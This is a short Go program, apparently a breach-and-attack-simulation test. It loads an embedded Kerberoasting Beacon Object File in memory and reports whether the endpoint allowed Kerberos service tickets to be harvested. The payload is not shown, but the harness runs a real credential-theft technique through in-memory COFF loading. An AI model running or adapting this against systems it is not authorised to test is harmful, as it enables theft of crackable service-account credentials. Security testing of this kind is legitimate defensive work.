package main

import (
	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"
	"strings"

	_ "embed"
	"github.com/praetorian-inc/chariot-bas/internal/endpoint"
)

//go:embed static/bofs/Kerberoast.x64.o.gz
var bof []byte
var argBytes []byte

func bof_test() {
	decompressedBytes, _ := endpoint.Decompress(bof)

	output, _ := coff.Load(decompressedBytes, argBytes)

	if strings.Contains(output, "<TICKET>") {
		endpoint.Stop(endpoint.Risk.Allowed)
	}

	endpoint.Stop(endpoint.Protected.NotRelevant)
}

func bof_cleanup() {
	return
}

func main() {
	argBytes, _ = lighthouse.PackArgs([]string{"roast"})
	if argBytes == nil {
		argBytes = make([]byte, 1)
	}
	endpoint.Start(bof_test, bof_cleanup)
}
